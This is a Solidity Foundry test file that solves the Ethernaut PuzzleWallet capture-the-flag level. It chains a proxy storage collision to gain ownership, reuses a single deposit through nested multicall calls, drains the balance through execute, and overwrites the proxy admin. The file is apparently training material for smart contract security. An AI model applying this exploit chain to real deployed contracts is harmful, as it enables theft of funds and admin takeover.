// SPDX-License-Identifer: MIT

pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/Ethernaut.sol";
import "../src/levels/PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is DSTest {
    Ethernaut ethernaut;
    PuzzleWalletFactory puzzleWalletFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoa = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        puzzleWalletFactory = new PuzzleWalletFactory();
        ethernaut.registerLevel(puzzleWalletFactory);
    }

    function testIsPuzzleWalletCleared() public {
        vm.startPrank(eoa);

        vm.deal(eoa, 1 ether);

        address payable instance = payable(
            ethernaut.createLevelInstance{value: 0.001 ether}(
                puzzleWalletFactory
            )
        );

        PuzzleProxy puzzleProxy = PuzzleProxy(instance);
        puzzleProxy.proposeNewAdmin(eoa);

        (bool addToWhitelistSuccess, ) = instance.call(
            abi.encodeWithSignature("addToWhitelist(address)", eoa)
        );
        require(addToWhitelistSuccess, "addToWhitelist() failed");

        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data2 = new bytes[](2);
        data2[0] = abi.encodeWithSignature("multicall(bytes[])", data);
        data2[1] = abi.encodeWithSignature("deposit()");

        (bool multicallSuccess, ) = instance.call{value: 0.001 ether}(
            abi.encodeWithSignature("multicall(bytes[])", data2)
        );
        require(multicallSuccess, "multicall() failed");

        (bool executeSuccess, ) = instance.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                eoa,
                0.002 ether,
                ""
            )
        );
        require(executeSuccess, "execute() failed");

        (bool setMaxBalanceSuccess, ) = instance.call(
            abi.encodeWithSignature("setMaxBalance(uint256)", 69)
        );
        require(setMaxBalanceSuccess, "setMaxBalance() failed");

        assertTrue(ethernaut.submitLevelInstance(instance));

        vm.stopPrank();
    }
}
